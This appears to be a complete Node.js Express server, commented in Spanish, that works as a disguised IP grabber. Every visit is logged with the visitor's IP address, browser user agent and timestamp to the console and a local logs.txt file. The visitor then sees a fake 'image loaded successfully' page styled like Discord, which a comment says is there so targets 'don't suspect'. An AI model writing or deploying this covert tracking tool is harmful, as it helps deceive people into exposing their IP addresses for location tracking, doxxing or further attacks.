const express = require('express');
const app = express();
const fs = require('fs');

// Puerto que usa Render (si no está definido, usa 3000 localmente)
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    // Capturamos la IP remota
    const ip = req.ip || req.connection.remoteAddress;
    
    // Capturamos el dispositivo/navegador
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    const timestamp = new Date().toISOString();

    // Log en la consola del servidor
    console.log(`\n🎯 [IP CAPTURADA] ${ip} | Dispositivo: ${userAgent.substring(0, 60)}...`);

    // Guardar en archivo local (útil si reinicias el server y quieres ver historial)
    try {
        fs.appendFileSync('logs.txt', `${timestamp} - IP: ${ip} - UA: ${userAgent}\n`);
    } catch (err) {
        console.error("Error escribiendo logs", err);
    }

    // Respuesta visual limpia para que no sospechen
    res.send(`
        <html>
            <body style="background-color: #2f3136; color: #dcddde; font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
                <div style="text-align: center;">
                    <h2>✅ Imagen cargada correctamente</h2>
                    <p style="font-size: 14px; color: #72767d;">Puedes cerrar esta pestaña.</p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
});